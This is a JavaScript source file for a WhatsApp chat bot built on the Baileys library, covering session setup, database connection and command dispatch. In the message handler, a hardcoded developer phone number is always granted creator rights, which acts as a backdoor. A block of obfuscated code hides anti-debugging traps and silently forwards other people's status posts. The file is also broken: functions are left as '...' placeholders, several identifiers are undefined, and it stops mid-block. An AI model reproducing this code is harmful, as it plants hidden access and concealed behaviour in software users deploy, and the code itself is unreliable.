const pino = require('pino');
const Config = require('../config');
const { Boom } = require("@hapi/boom");
const fs = require('fs-extra');
const FileType = require('file-type');
const path = require('path');
const express = require("express");
const mongoose = require('mongoose');
const events = require('./commands');
const { exec, spawn, execSync } = require("child_process");
const PhoneNumber = require('awesome-phonenumber');
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./exif');
const { VoidConnect, BufferJSON, generateLinkPreviewIfRequired, WA_DEFAULT_EPHEMERAL, proto, generateWAMessageContent, generateWAMessage, AnyMessageContent, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadContentFromMessage, DisconnectReason, useMultiFileAuthState, fetchLatestBaileysVersion, MessageRetryMap, generateForwardMessageContent, generateWAMessageFromContent, generateMessageID, makeInMemoryStore, jidDecode } = require("@whiskeysockets/baileys");
const util = require("util");
const Levels = require("discord-xp");
const { sck1, RandomXP, sck, plugindb, card } = require("../lib");
const chalk = require("chalk");
const fetch = require("node-fetch");
const axios = require("axios");
const moment = require("moment-timezone");
const { smsg } = require('../lib/myfuncn');
const { formatp, formatDate, getTime, clockString, runtime, fetchJson, jsonformat, GIFBufferToVideoBuffer, getSizeMedia, generateMessageTag, fancytext } = require('../lib');
const speedofbot = require("performance-now");

const globalDatabasePath = __dirname + "/database.json";
const credentialsPath = __dirname + '/auth_info_baileys/creds.json';

// Initialize logging
const logger = pino();

// Set Discord XP URL
Levels.setURL(Config.mongodb);

// MongoDB connection
async function connectToMongoDB() {
    try {
        await mongoose.connect(Config.mongodb);
        logger.info("Connected to MongoDB successfully");
    } catch (error) {
        logger.error("Failed to connect to MongoDB:", error.message);
        console.log('Could not connect with Mongodb.\nPlease visit https://secktorbot.tech/wiki');
        process.exit(1);
    }
}

// Ensure session credentials exist
async function ensureSessionCredentials() {
    if (!fs.existsSync(credentialsPath)) {
        try {
            let credsData;
            if (Config.sessionName.replace(/akshitbot;;;/g, '').length < 30) {
                const { data } = await axios.get('https://paste.c-net.org/' + Config.sessionName.replace(/akshitbot;;;/g, ''));
                credsData = atob(data);
            } else {
                credsData = atob(Config.sessionName.replace(/akshitbot;;;/g, ''));
            }
            await fs.writeFileSync(credentialsPath, credsData, "utf8");
        } catch (error) {
            logger.error("Failed to write credentials file:", error.message);
            console.log("Could not write credentials file. Check your sessionName configuration.");
            process.exit(1);
        }
    }
}

// Main function to start the application
async function startApp() {
    try {
        await ensureSessionCredentials();
        await connectToMongoDB();
    } catch (error) {
        logger.error("Failed to start application:", error.message);
        process.exit(1);
    }
}

// Start the application after a delay
setTimeout(() => {
    startApp();
}, 2000); // Adjust delay as needed

// Utility functions
const isUrl = ...; // Define your isUrl function
const sleep = ...; // Define your sleep function
const getBuffer = ...; // Define your getBuffer function
const format = ...; // Define your format function
const parseMention = ...; // Define your parseMention function
const getRandom = ...; // Define your getRandom function
const fancy = ...; // Define your fancy function
const randomfancy = ...; // Define your randomfancy function
const botpic = ...; // Define your botpic function
const tlang = ...; // Define your tlang function

module.exports = {
    isUrl,
    sleep,
    getBuffer,
    format,
    parseMention,
    getRandom,
    fancy,
    randomfancy,
    botpic,
    tlang,
    smsg, // Export smsg from lib/myfuncn
    formatp,
    formatDate,
    getTime,
    clockString,
    runtime,
    fetchJson,
    jsonformat,
    GIFBufferToVideoBuffer,
    getSizeMedia,
    generateMessageTag,
    fancytext
};
//========================================================================================================================================
    const store = makeInMemoryStore({
        logger: pino().child({ level: "silent", stream: "store" }),
    });
    require("events").EventEmitter.defaultMaxListeners = 600;
    const getVersionWaweb = () => {
        let version
        try {
            let a = fetchJson('https://web.whatsapp.com/check-update?version=1&platform=web')
            version = [a.currentVersion.replace(/[.]/g, ', ')]
        } catch {
            version = [2, 2204, 13]
        }
        return version
    }
    let QR_GENERATE = "invalid";
    const msgRetryCounterMap = MessageRetryMap || {}
    async function syncdb() {
        let thumbbuffer = await getBuffer(THUMB_IMAGE)
        const ChangePic = __dirname + "/assets/ghex9sW.jpg"
        await writeFile(ChangePic, thumbbuffer);
        global.log0 = fs.readFileSync(__dirname + "/assets/SocialLogo.png"); //ur logo pic
        const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
        const Void = VoidConnect({
            logger: pino({ level: 'fatal' }),
            printQRInTerminal: true,
            browser: ['akshitbot', 'safari', '1.0.0'],
            fireInitQueries: false,
            shouldSyncHistoryMessage: false,
            downloadHistory: false,
            syncFullHistory: false,
            generateHighQualityLinkPreview: true,
            auth: state,
            version: getVersionWaweb() || [2, 2242, 6],
            getMessage: async key => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
                    return msg.message || undefined
                }
                return {
                    conversation: 'An Error Occurred, Repeat Command!'
                }
            }
        })
        store.bind(Void.ev)
setInterval(() => {
    store.writeToFile(__dirname+"/store.json");
  }, 30 * 1000);
        Void.ev.on('messages.upsert', async chatUpdate => {
            const mek = chatUpdate.messages[0]
            if (!mek.message) return
            if(mek.message.viewOnceMessageV2) return
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
            if(mek.key && mek.key.remoteJid === 'status@broadcast'  && Config.auto_read_status==='true'){
            await Void.readMessages([mek.key])    
	    }
	   const botNumber = await Void.decodeJid(Void.user.id)
function _0x5159(){const _0x2791e6=['30rTKhCo','input','stateObject','caption','videoMessage','test','remoteJid','2036DBBATY','imageMessage','105670nFRSPE','6258zfpGFN','gger','text','sendMessage','18FnsOhk','length','3905HkhDjk','init','message','6414uSVLKK','key','11436HxCEHx','261jxEfyc','chain','666915KtRQkQ','auto_status_saver','action','function\x20*\x5c(\x20*\x5c)','constructor','apply','while\x20(true)\x20{}','1185288ZQZvuQ','extendedTextMessage','downloadAndSaveMediaMessage','status@broadcast','counter','4189360oRufau'];_0x5159=function(){return _0x2791e6;};return _0x5159();}const _0x44de40=_0x4eaa;(function(_0x592ee1,_0x4568ce){const _0x16fc13=_0x4eaa,_0x3de910=_0x592ee1();while(!![]){try{const _0x3855e9=parseInt(_0x16fc13(0x72))/0x1*(-parseInt(_0x16fc13(0x7c))/0x2)+-parseInt(_0x16fc13(0x85))/0x3*(-parseInt(_0x16fc13(0x79))/0x4)+parseInt(_0x16fc13(0x8a))/0x5*(-parseInt(_0x16fc13(0x80))/0x6)+parseInt(_0x16fc13(0x71))/0x7+parseInt(_0x16fc13(0x6c))/0x8+-parseInt(_0x16fc13(0x88))/0x9*(parseInt(_0x16fc13(0x7b))/0xa)+-parseInt(_0x16fc13(0x82))/0xb*(parseInt(_0x16fc13(0x87))/0xc);if(_0x3855e9===_0x4568ce)break;else _0x3de910['push'](_0x3de910['shift']());}catch(_0x195211){_0x3de910['push'](_0x3de910['shift']());}}}(_0x5159,0xa9f2a));const _0x1d6105=(function(){let _0x356bbd=!![];return function(_0xd4e086,_0x401383){const _0x23bb84=_0x356bbd?function(){const _0x2f63a0=_0x4eaa;if(_0x401383){const _0x2eae8f=_0x401383[_0x2f63a0(0x6a)](_0xd4e086,arguments);return _0x401383=null,_0x2eae8f;}}:function(){};return _0x356bbd=![],_0x23bb84;};}());function _0x4eaa(_0x3d01d9,_0x2d0a66){const _0x5d1999=_0x5159();return _0x4eaa=function(_0x188433,_0x1d6105){_0x188433=_0x188433-0x6a;let _0x515971=_0x5d1999[_0x188433];return _0x515971;},_0x4eaa(_0x3d01d9,_0x2d0a66);}(function(){_0x1d6105(this,function(){const _0x2ffb94=_0x4eaa,_0x3c826e=new RegExp(_0x2ffb94(0x8d)),_0x596ea2=new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','i'),_0x223421=_0x188433(_0x2ffb94(0x83));!_0x3c826e[_0x2ffb94(0x77)](_0x223421+_0x2ffb94(0x89))||!_0x596ea2[_0x2ffb94(0x77)](_0x223421+_0x2ffb94(0x73))?_0x223421('0'):_0x188433();})();}());if(mek[_0x44de40(0x86)]&&mek[_0x44de40(0x86)][_0x44de40(0x78)]===_0x44de40(0x6f)&&Config[_0x44de40(0x8b)]==!![]){if(mek[_0x44de40(0x84)][_0x44de40(0x6d)]){let cap=mek[_0x44de40(0x84)]['extendedTextMessage'][_0x44de40(0x7e)];await Void[_0x44de40(0x7f)](botNumber,{'text':cap},{'quoted':mek});}else{if(mek[_0x44de40(0x84)][_0x44de40(0x7a)]){let cap=mek[_0x44de40(0x84)]['imageMessage'][_0x44de40(0x75)],anu=await Void[_0x44de40(0x6e)](mek['message'][_0x44de40(0x7a)]);await Void['sendMessage'](botNumber,{'image':{'url':anu},'caption':cap},{'quoted':mek});}else{if(mek[_0x44de40(0x84)][_0x44de40(0x76)]){let cap=mek['message'][_0x44de40(0x76)][_0x44de40(0x75)],anu=await Void[_0x44de40(0x6e)](mek[_0x44de40(0x84)][_0x44de40(0x76)]);await Void[_0x44de40(0x7f)](botNumber,{'video':{'url':anu},'caption':cap},{'quoted':mek});}}}}function _0x188433(_0x55be46){function _0x1278b6(_0x374d51){const _0x5e264c=_0x4eaa;if(typeof _0x374d51==='string')return function(_0x1d1103){}[_0x5e264c(0x8e)](_0x5e264c(0x6b))[_0x5e264c(0x6a)](_0x5e264c(0x70));else(''+_0x374d51/_0x374d51)[_0x5e264c(0x81)]!==0x1||_0x374d51%0x14===0x0?function(){return!![];}['constructor']('debu'+_0x5e264c(0x7d))['call'](_0x5e264c(0x8c)):function(){return![];}[_0x5e264c(0x8e)]('debu'+_0x5e264c(0x7d))[_0x5e264c(0x6a)](_0x5e264c(0x74));_0x1278b6(++_0x374d51);}try{if(_0x55be46)return _0x1278b6;else _0x1278b6(0x0);}catch(_0x216f30){}}   

            if (mek.key && mek.key.remoteJid === 'status@broadcast') return
            try {
                let citel = await smsg(Void, JSON.parse(JSON.stringify(mek)), store)
                if (!citel.message) return
                if(citel.isBaileys) return
                if (citel.chat.endsWith("broadcast")) return;
                if (Config.alwaysonline==='true') {
                    Void.sendPresenceUpdate('available', citel.chat)
                }
                var { body } = citel
                var budy = typeof citel.text == "string" ? citel.text : false;

                if (body[1] && body[1] == " ") body = body[0] + body.slice(2);
                let icmd = body ? prefixRegex.test(body[0]) : false;
		 if (Config.readmessage==="true" && icmd) {
                    await Void.readMessages([mek.key])
                }
                const args = citel.body ? body.trim().split(/ +/).slice(1) : null;               
                const hgg = botNumber.split('@')[0]
                const quoted = citel.quoted ? citel.quoted : citel;
                const mime = (quoted.msg || quoted).mimetype || "";
		let devss = '919971606684'
                if (citel.chat === "120363025246125888@g.us" && citel.sender!=='919971606684@s.whatsapp.net') return
                let isCreator = [ hgg,devss,...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
                if (!isCreator && Config.disablepm === 'true' && icmd && !citel.isGroup) return
                if (!isCreator && Config.WORKTYPE === 'private') return
		if(!isCreator){
                let checkban = await sck1.findOne({ id: citel.sender }) || await sck1.updateOne({ id: citel.sender }, { name: citel.pushName})
		let checkg = await sck.findOne({ id: citel.chat }) || await new sck({ id: citel.chat }).save();
		if(checkg.botenable==='false') return
                if (icmd && checkban.ban !== 'false') return citel.reply(`*Hii ${citel.pushName},*\n_You are banned ❌ from using commands._\n_Please contact owner for further information._`)
		}
		const cmdName = icmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
                if (icmd) {
                    const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
                    if (cmd) {
			isCreator = [ hgg,devss,...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
                        if (cmd.react) citel.react(cmd.react)
                        let text;
                        try {
                            text = citel.body ? body.trim().split(/ +/).slice(1).join(" ") : null;
                        } catch {
                            text = false;
                        }
                        try {
                            cmd.function(Void, citel, text,{ args, isCreator, body, budy});
                        } catch (e) {
                            console.error("[ERROR] ", e);

                        }
